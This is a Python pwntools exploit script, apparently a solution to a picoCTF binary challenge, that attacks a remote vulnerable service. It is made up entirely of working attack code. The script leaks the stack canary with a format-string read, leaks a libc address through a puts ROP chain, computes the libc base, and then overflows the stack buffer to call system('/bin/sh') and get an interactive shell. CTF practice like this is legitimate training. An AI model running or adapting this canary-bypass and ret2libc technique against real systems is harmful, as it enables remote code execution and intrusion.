from pwn import *

context.binary = binary = ELF('./vuln', checksec=False)
libc = ELF('./libc6-i386_2.27-3ubuntu1.6_amd64', checksec=False)

win_number = -3727

p = remote('jupiter.challenges.picoctf.org', 18263)

p.sendline(str(win_number).encode())
p.sendline(b'LEAK%135$p')

p.recvuntil(b'LEAK')

canary = int(p.recvline()[:-1].decode(), 16)

info(f'Canary: {hex(canary)}')

puts_got = p32(binary.got.puts)
puts_plt = p32(binary.plt.puts)
win = p32(binary.symbols.win)

leak_payload = b'A' * 512
leak_payload += p32(canary)
leak_payload += b'B' * 12
leak_payload += puts_plt
leak_payload += win
leak_payload += puts_got

p.sendline(str(win_number).encode())
p.sendline(leak_payload)

p.recvuntil(b'A' * 512 + b'\n\n')

puts_leak = u32(p.recv(4))
info(f'puts(): {hex(puts_leak)}')

libc.address = puts_leak - 0x67560

info(f'LIBC Base: {hex(libc.address)}')

system = p32(libc.symbols.system)
bin_sh = p32(next(libc.search(b'/bin/sh\x00')))

info(f'system(): {hex(u32(system))}')
info(f'/bin/sh: {hex(u32(bin_sh))}')

exploit = b'A' * 512
exploit += p32(canary)
exploit += b'B' * 12
exploit += system
exploit += b'C' * 4
exploit += bin_sh

p.sendline(exploit)

p.recvrepeat(1)

p.interactive()
